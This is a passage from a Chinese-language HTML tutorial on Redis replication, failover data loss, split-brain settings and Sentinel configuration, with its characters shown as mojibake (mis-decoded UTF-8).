æ’­é˜¶æ®µï¼Œä¸»èŠ‚ç‚¹æ”¶åˆ°æ–°çš„å†™å‘½ä»¤åï¼Œä¼šå‘é€ç»™ä»èŠ‚ç‚¹ã€‚ä½†æ˜¯ï¼Œä¸»èŠ‚ç‚¹å¹¶ä¸ä¼šç­‰åˆ°ä»èŠ‚ç‚¹å®é™…æ‰§è¡Œå®Œå‘½ä»¤åï¼Œå†æŠŠç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè€Œæ˜¯ä¸»èŠ‚ç‚¹è‡ªå·±åœ¨æœ¬åœ°æ‰§è¡Œå®Œå‘½ä»¤åï¼Œå°±ä¼šå‘å®¢æˆ·ç«¯è¿”å›ç»“æœäº†ã€‚å¦‚æœä»èŠ‚ç‚¹è¿˜æ²¡æœ‰æ‰§è¡Œä¸»èŠ‚ç‚¹åŒæ­¥è¿‡æ¥çš„å‘½ä»¤ï¼Œä¸»ä»èŠ‚ç‚¹é—´çš„æ•°æ®å°±ä¸ä¸€è‡´äº†.</p><p><strong>å¦‚ä½•åº”å¯¹</strong>:<br>ç¬¬ä¸€ç§æ–¹æ³•ï¼Œå°½é‡ä¿è¯ä¸»ä»èŠ‚ç‚¹é—´çš„ç½‘ç»œè¿æ¥çŠ¶å†µè‰¯å¥½ï¼Œé¿å…ä¸»ä»èŠ‚ç‚¹åœ¨ä¸åŒçš„æœºæˆ¿ã€‚</p><p>ç¬¬äºŒç§æ–¹æ³•ï¼Œå¯ä»¥å¼€å‘ä¸€ä¸ªå¤–éƒ¨ç¨‹åºæ¥ç›‘æ§ä¸»ä»èŠ‚ç‚¹é—´çš„å¤åˆ¶è¿›åº¦ã€‚å…·ä½“åšæ³•ï¼š</p><ul><li><p>Redis çš„ INFO replication å‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸»èŠ‚ç‚¹æ¥æ”¶å†™å‘½ä»¤çš„è¿›åº¦ä¿¡æ¯ï¼ˆmaster_repl_offsetï¼‰å’Œä»èŠ‚ç‚¹å¤åˆ¶å†™å‘½ä»¤çš„è¿›åº¦ä¿¡æ¯ï¼ˆslave_repl_offsetï¼‰ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å‘ä¸€ä¸ªç›‘æ§ç¨‹åºï¼Œå…ˆç”¨ INFO replication å‘½ä»¤æŸ¥åˆ°ä¸»ã€ä»èŠ‚ç‚¹çš„è¿›åº¦ï¼Œç„¶åï¼Œæˆ‘ä»¬ç”¨ master_repl_offset å‡å» slave_repl_offsetï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°ä»èŠ‚ç‚¹å’Œä¸»èŠ‚ç‚¹é—´çš„å¤åˆ¶è¿›åº¦å·®å€¼äº†ã€‚</p></li><li><p>å¦‚æœæŸä¸ªä»èŠ‚ç‚¹çš„è¿›åº¦å·®å€¼å¤§äºæˆ‘ä»¬é¢„è®¾çš„é˜ˆå€¼ï¼Œæˆ‘ä»¬å¯ä»¥è®©å®¢æˆ·ç«¯ä¸å†å’Œè¿™ä¸ªä»èŠ‚ç‚¹è¿æ¥è¿›è¡Œæ•°æ®è¯»å–ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘è¯»åˆ°ä¸ä¸€è‡´æ•°æ®çš„æƒ…å†µã€‚ä¸è¿‡ï¼Œä¸ºäº†é¿å…å‡ºç°å®¢æˆ·ç«¯å’Œæ‰€æœ‰ä»èŠ‚ç‚¹éƒ½ä¸èƒ½è¿æ¥çš„æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦æŠŠå¤åˆ¶è¿›åº¦å·®å€¼çš„é˜ˆå€¼è®¾ç½®å¾—å¤§ä¸€äº›ã€‚</p></li></ul><h4 id="ä¸»ä»åˆ‡æ¢å¦‚ä½•å‡å°‘æ•°æ®ä¸¢å¤±ï¼Ÿ"><a href="#ä¸»ä»åˆ‡æ¢å¦‚ä½•å‡å°‘æ•°æ®ä¸¢å¤±ï¼Ÿ" class="headerlink" title="ä¸»ä»åˆ‡æ¢å¦‚ä½•å‡å°‘æ•°æ®ä¸¢å¤±ï¼Ÿ"></a>ä¸»ä»åˆ‡æ¢å¦‚ä½•å‡å°‘æ•°æ®ä¸¢å¤±ï¼Ÿ</h4><p>ä¸»ä»åˆ‡æ¢è¿‡ç¨‹ä¸­ï¼Œäº§ç”Ÿæ•°æ®ä¸¢å¤±çš„æƒ…å†µæœ‰ä¸¤ç§ï¼š</p><ul><li>å¼‚æ­¥å¤åˆ¶åŒæ­¥ä¸¢å¤±</li><li>é›†ç¾¤äº§ç”Ÿè„‘è£‚æ•°æ®ä¸¢å¤±<br>æˆ‘ä»¬ä¸å¯èƒ½ä¿è¯æ•°æ®å®Œå…¨ä¸ä¸¢å¤±ï¼Œåªèƒ½åšåˆ°ä½¿å¾—å°½é‡å°‘çš„æ•°æ®ä¸¢å¤±ã€‚</li></ul><p><strong>å¼‚æ­¥å¤åˆ¶åŒæ­¥ä¸¢å¤±</strong><br>å½“å®¢æˆ·ç«¯å‘é€å†™è¯·æ±‚ç»™ä¸»èŠ‚ç‚¹çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šè¿”å› okï¼Œæ¥ç€ä¸»èŠ‚ç‚¹å°†å†™è¯·æ±‚å¼‚æ­¥åŒæ­¥ç»™å„ä¸ªä»èŠ‚ç‚¹ï¼Œä½†æ˜¯å¦‚æœæ­¤æ—¶ä¸»èŠ‚ç‚¹è¿˜æ²¡æ¥å¾—åŠåŒæ­¥ç»™ä»èŠ‚ç‚¹æ—¶å‘ç”Ÿäº†æ–­ç”µï¼Œé‚£ä¹ˆä¸»èŠ‚ç‚¹å†…å­˜ä¸­çš„æ•°æ®ä¼šä¸¢å¤±ã€‚</p><p>Redis é…ç½®é‡Œæœ‰ä¸€ä¸ªå‚æ•° <code>min-slaves-max-lag</code>ï¼Œè¡¨ç¤ºä¸€æ—¦æ‰€æœ‰çš„ä»èŠ‚ç‚¹æ•°æ®å¤åˆ¶å’ŒåŒæ­¥çš„å»¶è¿Ÿéƒ½è¶…è¿‡äº† min-slaves-max-lag å®šä¹‰çš„å€¼ï¼Œé‚£ä¹ˆä¸»èŠ‚ç‚¹å°±ä¼šæ‹’ç»æ¥æ”¶ä»»ä½•è¯·æ±‚ã€‚</p><p>å‡è®¾å°† min-slaves-max-lag é…ç½®ä¸º 10s åï¼Œæ ¹æ®ç›®å‰ master-&gt;slave çš„å¤åˆ¶é€Ÿåº¦ï¼Œå¦‚æœæ•°æ®åŒæ­¥å®Œæˆæ‰€éœ€è¦æ—¶é—´è¶…è¿‡10sï¼Œå°±ä¼šè®¤ä¸º master æœªæ¥å®•æœºåæŸå¤±çš„æ•°æ®ä¼šå¾ˆå¤šï¼Œmaster å°±æ‹’ç»å†™å…¥æ–°è¯·æ±‚ã€‚è¿™æ ·å°±èƒ½å°† master å’Œ slave æ•°æ®å·®æ§åˆ¶åœ¨10så†…ï¼Œå³ä½¿ master å®•æœºä¹Ÿåªæ˜¯è¿™æœªå¤åˆ¶çš„ 10s æ•°æ®ã€‚</p><p>é‚£ä¹ˆå¯¹äºå®¢æˆ·ç«¯ï¼Œå½“å®¢æˆ·ç«¯å‘ç° master ä¸å¯å†™åï¼Œæˆ‘ä»¬å¯ä»¥é‡‡å–é™çº§æªæ–½ï¼Œå°†æ•°æ®æš‚æ—¶å†™å…¥æœ¬åœ°ç¼“å­˜å’Œç£ç›˜ä¸­ï¼Œåœ¨ä¸€æ®µæ—¶é—´ï¼ˆç­‰ master æ¢å¤æ­£å¸¸ï¼‰åé‡æ–°å†™å…¥ master æ¥ä¿è¯æ•°æ®ä¸ä¸¢å¤±ï¼Œä¹Ÿå¯ä»¥å°†æ•°æ®å†™å…¥ kafka æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç­‰ master æ¢å¤æ­£å¸¸ï¼Œå†éš”ä¸€æ®µæ—¶é—´å»æ¶ˆè´¹ kafka ä¸­çš„æ•°æ®ï¼Œè®©å°†æ•°æ®é‡æ–°å†™å…¥ master ã€‚</p><p><strong>é›†ç¾¤äº§ç”Ÿè„‘è£‚æ•°æ®ä¸¢å¤±</strong><br>å¦‚æœä¸»èŠ‚ç‚¹çš„ç½‘ç»œçªç„¶å‘ç”Ÿäº†é—®é¢˜ï¼Œå®ƒä¸æ‰€æœ‰çš„ä»èŠ‚ç‚¹éƒ½å¤±è”äº†ï¼Œä½†æ˜¯æ­¤æ—¶çš„ä¸»èŠ‚ç‚¹å’Œå®¢æˆ·ç«¯çš„ç½‘ç»œæ˜¯æ­£å¸¸çš„ï¼Œè¿™ä¸ªå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“ Redis å†…éƒ¨å·²ç»å‡ºç°äº†é—®é¢˜ï¼Œè¿˜åœ¨ç…§æ ·çš„å‘è¿™ä¸ªå¤±è”çš„ä¸»èŠ‚ç‚¹å†™æ•°æ®ï¼ˆè¿‡ç¨‹Aï¼‰ï¼Œæ­¤æ—¶è¿™äº›æ•°æ®è¢«ä¸»èŠ‚ç‚¹ç¼“å­˜åˆ°äº†ç¼“å†²åŒºé‡Œï¼Œå› ä¸ºä¸»ä»èŠ‚ç‚¹ä¹‹é—´çš„ç½‘ç»œé—®é¢˜ï¼Œè¿™äº›æ•°æ®éƒ½æ˜¯æ— æ³•åŒæ­¥ç»™ä»èŠ‚ç‚¹çš„ã€‚</p><p>è¿™æ—¶ï¼Œå“¨å…µä¹Ÿå‘ç°ä¸»èŠ‚ç‚¹å¤±è”äº†ï¼Œå®ƒå°±è®¤ä¸ºä¸»èŠ‚ç‚¹æŒ‚äº†ï¼ˆä½†å®é™…ä¸Šä¸»èŠ‚ç‚¹æ­£å¸¸è¿è¡Œï¼Œåªæ˜¯ç½‘ç»œå‡ºé—®é¢˜äº†ï¼‰ï¼Œäºæ˜¯å“¨å…µå°±ä¼šåœ¨ä»èŠ‚ç‚¹ä¸­é€‰ä¸¾å‡ºä¸€ä¸ª leader ä½œä¸ºä¸»èŠ‚ç‚¹ï¼Œè¿™æ—¶é›†ç¾¤å°±æœ‰ä¸¤ä¸ªä¸»èŠ‚ç‚¹äº† â€”â€” è„‘è£‚å‡ºç°äº†ã€‚</p><p>è¿™æ—¶å€™ç½‘ç»œçªç„¶å¥½äº†ï¼Œå“¨å…µå› ä¸ºä¹‹å‰å·²ç»é€‰ä¸¾å‡ºä¸€ä¸ªæ–°ä¸»èŠ‚ç‚¹äº†ï¼Œå®ƒå°±ä¼šæŠŠæ—§ä¸»èŠ‚ç‚¹é™çº§ä¸ºä»èŠ‚ç‚¹ï¼ˆAï¼‰ï¼Œç„¶åä»èŠ‚ç‚¹ï¼ˆAï¼‰ä¼šå‘æ–°ä¸»èŠ‚ç‚¹è¯·æ±‚æ•°æ®åŒæ­¥ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡åŒæ­¥æ˜¯å…¨é‡åŒæ­¥çš„æ–¹å¼ï¼Œæ­¤æ—¶çš„ä»èŠ‚ç‚¹ï¼ˆAï¼‰ä¼šæ¸…ç©ºæ‰è‡ªå·±æœ¬åœ°çš„æ•°æ®ï¼Œç„¶åå†åšå…¨é‡åŒæ­¥ã€‚æ‰€ä»¥ï¼Œä¹‹å‰å®¢æˆ·ç«¯åœ¨è¿‡ç¨‹ A å†™å…¥çš„æ•°æ®å°±ä¼šä¸¢å¤±äº†ï¼Œä¹Ÿå°±æ˜¯é›†ç¾¤äº§ç”Ÿè„‘è£‚æ•°æ®ä¸¢å¤±çš„é—®é¢˜ã€‚</p><p><code>æ–¹æ¡ˆ</code>:å½“ä¸»èŠ‚ç‚¹å‘ç°ã€Œä»èŠ‚ç‚¹ä¸‹çº¿çš„æ•°é‡å¤ªå¤šã€ï¼Œæˆ–è€…ã€Œç½‘ç»œå»¶è¿Ÿå¤ªå¤§ã€çš„æ—¶å€™ï¼Œé‚£ä¹ˆä¸»èŠ‚ç‚¹ä¼šç¦æ­¢å†™æ“ä½œï¼Œç›´æ¥æŠŠé”™è¯¯è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>åœ¨ Redis çš„é…ç½®æ–‡ä»¶ä¸­æœ‰ä¸¤ä¸ªå‚æ•°æˆ‘ä»¬å¯ä»¥è®¾ç½®ï¼š</p><p>min-slaves-to-write xï¼Œä¸»èŠ‚ç‚¹å¿…é¡»è¦æœ‰è‡³å°‘ x ä¸ªä»èŠ‚ç‚¹è¿æ¥ï¼Œå¦‚æœå°äºè¿™ä¸ªæ•°ï¼Œä¸»èŠ‚ç‚¹ä¼šç¦æ­¢å†™æ•°æ®ã€‚<br>min-slaves-max-lag xï¼Œä¸»ä»æ•°æ®å¤åˆ¶å’ŒåŒæ­¥çš„å»¶è¿Ÿä¸èƒ½è¶…è¿‡ x ç§’ï¼Œå¦‚æœä¸»ä»åŒæ­¥çš„å»¶è¿Ÿè¶…è¿‡ x ç§’ï¼Œä¸»èŠ‚ç‚¹ä¼šç¦æ­¢å†™æ•°æ®ã€‚<br>æˆ‘ä»¬å¯ä»¥æŠŠ min-slaves-to-write å’Œ min-slaves-max-lag è¿™ä¸¤ä¸ªé…ç½®é¡¹æ­é…èµ·æ¥ä½¿ç”¨ï¼Œåˆ†åˆ«ç»™å®ƒä»¬è®¾ç½®ä¸€å®šçš„é˜ˆå€¼ï¼Œå‡è®¾ä¸º N å’Œ Tã€‚</p><p>è¿™ä¸¤ä¸ªé…ç½®é¡¹ç»„åˆåçš„è¦æ±‚æ˜¯ï¼Œä¸»èŠ‚ç‚¹è¿æ¥çš„ä»èŠ‚ç‚¹ä¸­è‡³å°‘æœ‰ N ä¸ªä»èŠ‚ç‚¹ï¼Œã€Œå¹¶ä¸”ã€ä¸»èŠ‚ç‚¹è¿›è¡Œæ•°æ®å¤åˆ¶æ—¶çš„ ACK æ¶ˆæ¯å»¶è¿Ÿä¸èƒ½è¶…è¿‡ T ç§’ï¼Œå¦åˆ™ï¼Œä¸»èŠ‚ç‚¹å°±ä¸ä¼šå†æ¥æ”¶å®¢æˆ·ç«¯çš„å†™è¯·æ±‚äº†ã€‚</p><p>å³ä½¿åŸä¸»èŠ‚ç‚¹æ˜¯å‡æ•…éšœï¼Œå®ƒåœ¨å‡æ•…éšœæœŸé—´ä¹Ÿæ— æ³•å“åº”å“¨å…µå¿ƒè·³ï¼Œä¹Ÿä¸èƒ½å’Œä»èŠ‚ç‚¹è¿›è¡ŒåŒæ­¥ï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•å’Œä»èŠ‚ç‚¹è¿›è¡Œ ACK ç¡®è®¤äº†ã€‚è¿™æ ·ä¸€æ¥ï¼Œmin-slaves-to-write å’Œ min-slaves-max-lag çš„ç»„åˆè¦æ±‚å°±æ— æ³•å¾—åˆ°æ»¡è¶³ï¼ŒåŸä¸»èŠ‚ç‚¹å°±ä¼šè¢«é™åˆ¶æ¥æ”¶å®¢æˆ·ç«¯å†™è¯·æ±‚ï¼Œå®¢æˆ·ç«¯ä¹Ÿå°±ä¸èƒ½åœ¨åŸä¸»èŠ‚ç‚¹ä¸­å†™å…¥æ–°æ•°æ®äº†ã€‚</p><p>ç­‰åˆ°æ–°ä¸»èŠ‚ç‚¹ä¸Šçº¿æ—¶ï¼Œå°±åªæœ‰æ–°ä¸»èŠ‚ç‚¹èƒ½æ¥æ”¶å’Œå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œæ­¤æ—¶ï¼Œæ–°å†™çš„æ•°æ®ä¼šè¢«ç›´æ¥å†™åˆ°æ–°ä¸»èŠ‚ç‚¹ä¸­ã€‚è€ŒåŸä¸»èŠ‚ç‚¹ä¼šè¢«å“¨å…µé™ä¸ºä»èŠ‚ç‚¹ï¼Œå³ä½¿å®ƒçš„æ•°æ®è¢«æ¸…ç©ºäº†ï¼Œä¹Ÿä¸ä¼šæœ‰æ–°æ•°æ®ä¸¢å¤±ã€‚æˆ‘å†æ¥ç»™ä½ ä¸¾ä¸ªä¾‹å­ã€‚</p><p>å‡è®¾æˆ‘ä»¬å°† min-slaves-to-write è®¾ç½®ä¸º 1ï¼ŒæŠŠ min-slaves-max-lag è®¾ç½®ä¸º 12sï¼ŒæŠŠå“¨å…µçš„ down-after-milliseconds è®¾ç½®ä¸º 10sï¼Œä¸»èŠ‚ç‚¹å› ä¸ºæŸäº›åŸå› å¡ä½äº† 15sï¼Œå¯¼è‡´å“¨å…µåˆ¤æ–­ä¸»èŠ‚ç‚¹å®¢è§‚ä¸‹çº¿ï¼Œå¼€å§‹è¿›è¡Œä¸»ä»åˆ‡æ¢ã€‚åŒæ—¶ï¼Œå› ä¸ºåŸä¸»èŠ‚ç‚¹å¡ä½äº† 15sï¼Œæ²¡æœ‰ä¸€ä¸ªä»èŠ‚ç‚¹èƒ½å’ŒåŸä¸»èŠ‚ç‚¹åœ¨ 12s å†…è¿›è¡Œæ•°æ®å¤åˆ¶ï¼ŒåŸä¸»èŠ‚ç‚¹ä¹Ÿæ— æ³•æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚äº†ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¸»ä»åˆ‡æ¢å®Œæˆåï¼Œä¹Ÿåªæœ‰æ–°ä¸»èŠ‚ç‚¹èƒ½æ¥æ”¶è¯·æ±‚ï¼Œä¸ä¼šå‘ç”Ÿè„‘è£‚ï¼Œä¹Ÿå°±ä¸ä¼šå‘ç”Ÿæ•°æ®ä¸¢å¤±çš„é—®é¢˜äº†ã€‚</p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><p><strong>è¿‡æœŸkeyå¦‚ä½•å¤„ç†?</strong><br>ä¸»èŠ‚ç‚¹ä¸­çš„keyè¢«åˆ é™¤æˆ–æ·˜æ±°,ä¼šæ¨¡æ‹Ÿä¸€æ¡åˆ é™¤å‘½ä»¤å‘é€ç»™ä»èŠ‚ç‚¹,ä»èŠ‚ç‚¹æ”¶åˆ°è¿™æ¡å‘½ä»¤å,ä¼šåˆ é™¤å¯¹åº”çš„key.</p><p><strong>ä¸ºäº†é¿å…ç½‘ç»œæ¢å¤æ—¶,é¢‘ç¹è¿›è¡Œå…¨é‡åŒæ­¥,è¯¥æ€ä¹ˆåš?</strong><br>è¦å°†repl_backlog_bufferç¼“å†²åŒºè°ƒå¾—å¤§ä¸€äº›,è‡³å°‘ä¸ºä¸»èŠ‚ç‚¹ä¸€ç§’å†™çš„æ•°æ®é‡<em>é‡è¿æ—¶é—´</em>2.</p><p><strong>å¦‚ä½•åˆ†æ‘Šä¸»æœåŠ¡å™¨çš„å‹åŠ›?</strong><br>å°†ä¸€éƒ¨åˆ†ä»èŠ‚ç‚¹å‡çº§ä¸ºå…¶ä»–ä»èŠ‚ç‚¹çš„ä¸»èŠ‚ç‚¹</p><p><strong>æ€ä¹ˆåˆ¤æ–­ Redis æŸä¸ªèŠ‚ç‚¹æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Ÿ</strong><br>Redis åˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦æ­£å¸¸å·¥ä½œï¼ŒåŸºæœ¬éƒ½æ˜¯é€šè¿‡äº’ç›¸çš„ ping-pong å¿ƒæ€æ£€æµ‹æœºåˆ¶ï¼Œå¦‚æœæœ‰ä¸€åŠä»¥ä¸Šçš„èŠ‚ç‚¹å» ping ä¸€ä¸ªèŠ‚ç‚¹çš„æ—¶å€™æ²¡æœ‰ pong å›åº”ï¼Œé›†ç¾¤å°±ä¼šè®¤ä¸ºè¿™ä¸ªèŠ‚ç‚¹æŒ‚æ‰äº†ï¼Œä¼šæ–­å¼€ä¸è¿™ä¸ªèŠ‚ç‚¹çš„è¿æ¥ã€‚</p><h3 id="å“¨å…µæ¨¡å¼"><a href="#å“¨å…µæ¨¡å¼" class="headerlink" title="å“¨å…µæ¨¡å¼"></a>å“¨å…µæ¨¡å¼</h3><p>ç»è¿‡ä¹‹å‰çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå®é™…ä¸Šæœ€å…³é”®çš„è¿˜æ˜¯ä¸»èŠ‚ç‚¹ï¼Œå› ä¸ºä¸€æ—¦ä¸»èŠ‚ç‚¹å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆæ•´ä¸ªä¸»ä»ç³»ç»Ÿå°†æ— æ³•å†™å…¥ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¾—æƒ³ä¸€ä¸ªåŠæ³•ï¼Œå¤„ç†ä¸€ä¸‹<strong>ä¸»èŠ‚ç‚¹æ•…éšœ</strong>çš„æƒ…å†µã€‚å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥å‚è€ƒSpringçš„æœåŠ¡æ²»ç†æ¨¡å¼ï¼Œæ¯”å¦‚Nacoså’ŒEurekaï¼Œæ‰€æœ‰çš„æœåŠ¡éƒ½ä¼šè¢«å®æ—¶ç›‘æ§ï¼Œé‚£ä¹ˆåªè¦å‡ºç°é—®é¢˜ï¼Œè‚¯å®šæ˜¯å¯ä»¥åŠæ—¶å‘ç°çš„ï¼Œå¹¶ä¸”èƒ½å¤Ÿé‡‡å–å“åº”çš„è¡¥æ•‘æªæ–½ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å³å°†ä»‹ç»çš„å“¨å…µï¼š</p><p><img src="https://pb01.s3.bitiful.net/5.png" alt="avatar"></p><p><strong>å“¨å…µ</strong> (<strong>ä¹Ÿæ˜¯ä¸€ä¸ªRedisæœåŠ¡å™¨</strong>)ä¼šå¯¹æ‰€æœ‰çš„èŠ‚ç‚¹è¿›è¡Œç›‘æ§ï¼Œå¦‚æœå‘ç°ä¸»èŠ‚ç‚¹å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆä¼šç«‹å³è®©ä»èŠ‚ç‚¹è¿›è¡ŒæŠ•ç¥¨ï¼Œé€‰ä¸¾ä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹å‡ºæ¥ï¼Œè¿™æ ·å°±ä¸ä¼šç”±äºä¸»èŠ‚ç‚¹çš„æ•…éšœå¯¼è‡´æ•´ä¸ªç³»ç»Ÿä¸å¯å†™ï¼ˆæ³¨æ„è¦å®ç°è¿™æ ·çš„åŠŸèƒ½æœ€å°çš„ç³»ç»Ÿå¿…é¡»æ˜¯ä¸€ä¸»ä¸€ä»ï¼Œå†å°çš„è¯å°±æ²¡æœ‰æ„ä¹‰äº†ï¼‰</p><p>é‚£ä¹ˆæ€ä¹ˆå¯åŠ¨ä¸€ä¸ªå“¨å…µå‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶(confæ–‡ä»¶)å³å¯ï¼Œä¿®æ”¹ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor name ip port number</span><br></pre></td></tr></table></figure></p><p>å…¶ä»–é…ç½®éƒ½æ˜¯æ¬¡è¦çš„,æˆ‘ä»¬éƒ½é‡‡ç”¨é»˜è®¤é…ç½®.</p><p>å…¶ä¸­ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªæ˜¯å›ºå®šï¼Œç¬¬ä¸‰ä¸ªæ˜¯ä¸ºç›‘æ§å¯¹è±¡åç§°ï¼Œéšæ„ï¼Œåé¢å°±æ˜¯ä¸»èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬IPåœ°å€å’Œç«¯å£ï¼Œæœ€åçš„ä¸€ä¸ªæ•°å­—çš„æ„æ€æ˜¯å½“æœ‰numberä¸ªå“¨å…µåˆ¤æ–­ä¸»èŠ‚ç‚¹æŒ‚æ‰å,æˆ‘ä»¬è®¤ä¸ºä¸»èŠ‚ç‚¹çœŸçš„æŒ‚æ‰äº†,ä¸€èˆ¬numberæ˜¯è¦æ¯”å“¨å…µæ•°é‡å°‘çš„,å› ä¸ºå“¨å…µä¹Ÿå¯èƒ½æŒ‚æ‰.å¦‚æœnumberç­‰äºå“¨å…µæ•°é‡,å¦‚æœå“¨å…µæŒ‚æ‰äº†ä¸€ä¸ª,é‚£ä¹ˆå°±æ°¸è¿œåˆ¤æ–­ä¸å‡ºä¸»èŠ‚ç‚¹æ˜¯å¦æŒ‚äº†.numberä¸€èˆ¬è®¾ç½®ä¸ºå“¨å…µæ•°é‡/2+1.</p><p><strong>ä¸éœ€è¦å¡«å†™å…¶ä»–å“¨å…µä¿¡æ¯,å¦‚ä½•ç»„æˆå“¨å…µé›†ç¾¤?</strong><br>å“¨å…µèŠ‚ç‚¹ä¹‹é—´é€šè¿‡redisçš„å‘å¸ƒè€…/è®¢é˜…è€…æœºåˆ¶äº’ç›¸å‘ç°,ä¸»èŠ‚ç‚¹æœ‰ä¸€ä¸ª<em>sentinel</em>:helloé¢‘é“,å“¨å…µå¯ä»¥å°†è‡ªå·±çš„ipå’Œç«¯å£ä¿¡æ¯å‘åˆ°è¿™ä¸ªé¢‘é“ä¸Š,è¿™æ ·å…¶ä»–å“¨å…µå°±å¯ä»¥é€šè¿‡è®¢é˜…è¿™ä¸ªé¢‘é“æ¥è·å–åˆ°è¿™ä¸ªå“¨å…µçš„ä¿¡æ¯,è¿™æ ·å“¨å…µä¹‹é—´å°±å¯ä»¥å»ºç«‹ç½‘ç»œ,å“¨å…µé›†ç¾¤å°±å½¢æˆäº†.</p><p><img src="https://pb01.s3.bitiful.net/167.webp" alt="avatar"></p><p>å“¨å…µæ¨¡å¼å¯åŠ¨åï¼Œä¼šè‡ªåŠ¨ç›‘æ§ä¸»èŠ‚ç‚¹ï¼Œç„¶åè¿˜ä¼šæ˜¾ç¤ºé‚£äº›èŠ‚ç‚¹æ˜¯ä½œä¸ºä»èŠ‚ç‚¹å­˜åœ¨çš„ã€‚å¦‚æœä¸»èŠ‚ç‚¹æŒ‚äº†,ä¸€ä¸ªå“¨å…µè®¤ä¸ºå…¶ä¸»è§‚ä¸‹çº¿,ä¼šå‘å…¶ä»–å“¨å…µå‘èµ·æŠ•ç¥¨,å¦‚æœè®¤ä¸ºä¸»èŠ‚ç‚¹ä¸»è§‚ä¸‹çº¿çš„æ•°é‡åˆ°è¾¾è®¾ç½®å¾—æ•°,åˆ™è®¤ä¸ºä¸»èŠ‚ç‚¹å®¢è§‚ä¸‹çº¿.ä¹‹åå°±è¦è¿›è¡Œä¸»ä»åˆ‡æ¢äº†,å“¨å…µèŠ‚ç‚¹ä¸­æŠ•ç¥¨é€‰å‡ºæ‰§è¡Œçš„leader.å€™é€‰è€…ä¸ºåˆ¤æ–­ä¸»èŠ‚ç‚¹å®¢è§‚ä¸‹çº¿çš„å“¨å…µ,å€™é€‰è€…å¯ä»¥ç»™è‡ªå·±æŠ•ç¥¨,å…¶ä»–å“¨å…µä¸èƒ½ç»™è‡ªå·±æŠ•ç¥¨,æ¯ä¸ªå“¨å…µåªæœ‰ä¸€æ¬¡æŠ•ç¥¨æœºä¼š.ä»»ä½•å€™é€‰è€…æƒ³è¦æˆä¸ºleaderéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶:</p><ul><li>æ‹¿åˆ°åŠæ•°ä»¥ä¸Šçš„ç¥¨</li><li>ç¥¨æ•°å¤§äºè®¾ç½®çš„numberå€¼</li></ul><p>ä¹‹åleaderä¼šé€‰å‡ºæ–°çš„ä¸»èŠ‚ç‚¹,å°†ä»èŠ‚ç‚¹æŒ‡å‘æ–°ä¸»èŠ‚ç‚¹,é€šçŸ¥å®¢æˆ·ç«¯ä¸»èŠ‚ç‚¹æ›´æ¢,å°†æ—§ä¸»èŠ‚ç‚¹å˜ä¸ºä»èŠ‚ç‚¹</p><p><strong>é‚£ä¹ˆï¼Œè¿™ä¸ªé€‰æ–°ä¸»èŠ‚ç‚¹çš„è§„åˆ™æ˜¯æ€æ ·çš„å‘¢ï¼Ÿæ˜¯åœ¨æ‰€æœ‰çš„ä»èŠ‚ç‚¹ä¸­éšæœºé€‰å–è¿˜æ˜¯éµå¾ªæŸç§è§„åˆ™å‘¢ï¼Ÿ</strong></p><ol><li><p>é¦–å…ˆä¼šæ ¹æ®ä¼˜å…ˆçº§è¿›è¡Œé€‰æ‹©ï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®ï¼Œæ·»åŠ replica-priorityé…ç½®é¡¹ï¼ˆé»˜è®¤æ˜¯100ï¼‰ï¼Œè¶Šå°è¡¨ç¤ºä¼˜å…ˆçº§è¶Šé«˜ã€‚</p></li><li><p>å¦‚æœä¼˜å…ˆçº§ä¸€æ ·ï¼Œé‚£å°±é€‰æ‹©åç§»é‡æœ€å¤§çš„</p></li><li><p>è¦æ˜¯è¿˜é€‰ä¸å‡ºæ¥ï¼Œé‚£å°±é€‰æ‹©runidï¼ˆå¯åŠ¨æ—¶éšæœºç”Ÿæˆçš„ï¼‰æœ€å°çš„ã€‚</p></li></ol><h3 id="é›†ç¾¤æ¨¡å¼"><a href="#é›†ç¾¤æ¨¡å¼" class="headerlink" title="é›†ç¾¤æ¨¡å¼"></a>é›†ç¾¤æ¨¡å¼</h3><p>å¦‚æœæˆ‘ä»¬æœåŠ¡å™¨çš„å†…å­˜ä¸å¤Ÿç”¨äº†ï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬çš„Redisåˆéœ€è¦ç»§ç»­å­˜å‚¨å†…å®¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨é›†ç¾¤æ¥å®ç°æ‰©å®¹ã€‚</p><p>å› 